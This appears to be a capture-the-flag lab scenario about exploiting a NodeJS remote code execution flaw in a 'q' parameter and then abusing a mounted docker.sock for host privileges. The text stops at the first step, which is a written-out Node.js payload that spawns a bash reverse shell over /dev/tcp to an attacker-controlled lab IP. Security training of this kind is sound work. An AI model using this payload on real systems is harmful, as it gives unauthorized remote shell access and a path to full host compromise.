# Attacking insecure volume mounts - Scenario

In this scenario we will be exploiting a NodeJS application using remote code execution to gain a reverse shell. Then we will use the volume mounted `docker.sock` to gain privileges in the host system with docker runtime.

* The application is running at CTF VM. You can access it by navigating to `http://CTFVMIP`

![node app home page](images/insecure-mount-node-app.png)

* This NodeJS application is vulnerable to remote code execution (RCE) in `q` GET parameter. Access the endpoint using `http://CTFVMIP/?q="docker"`

![vulnerable parameter](images/insecure-mount-vulnerable-parameter.png)

* To exploit this RCE, we will be using below payload. Here `192.168.56.3` need to replace with your student VM IP

```bash
require("child_process").exec('bash -c "bash -i >%26 /dev/tcp/192.168.56.3/5555 0>%261"')
```